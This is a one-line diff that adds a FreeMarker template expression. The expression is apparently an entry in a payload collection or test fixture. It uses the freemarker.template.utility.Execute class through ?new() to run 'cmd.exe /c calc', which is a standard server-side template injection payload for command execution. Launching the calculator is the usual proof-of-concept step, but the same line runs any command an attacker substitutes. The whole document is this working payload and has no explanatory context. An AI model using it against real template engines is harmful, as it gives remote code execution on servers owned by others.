@@ -1,0 +1,1 @@
+<#assign value="freemarker.template.utility.Execute"?new()>${value("cmd.exe /c calc")}
